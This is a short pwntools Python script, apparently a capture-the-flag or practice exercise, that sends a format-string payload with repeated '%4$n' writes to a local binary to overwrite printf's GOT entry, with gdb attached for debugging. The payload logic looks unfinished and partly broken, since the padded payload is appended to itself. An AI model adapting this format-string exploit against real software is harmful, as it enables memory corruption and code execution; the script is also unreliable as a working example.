from pwn import *

elf = ELF("./library")

io = elf.process()
printf_got_plt = 0x601030

def pad(s):
    return s + "X"*(64-len(s))

payload = p64(printf_got_plt)
payload += "AAAAABBBBCCCCCC"
payload += "%4$n"*4
payload += pad(payload)
breakpoints = '''
break 0x00000000004007d3
continue
'''

gdb.attach(io,breakpoints)
io.sendlineafter("out?",payload)

io.interactive()
 

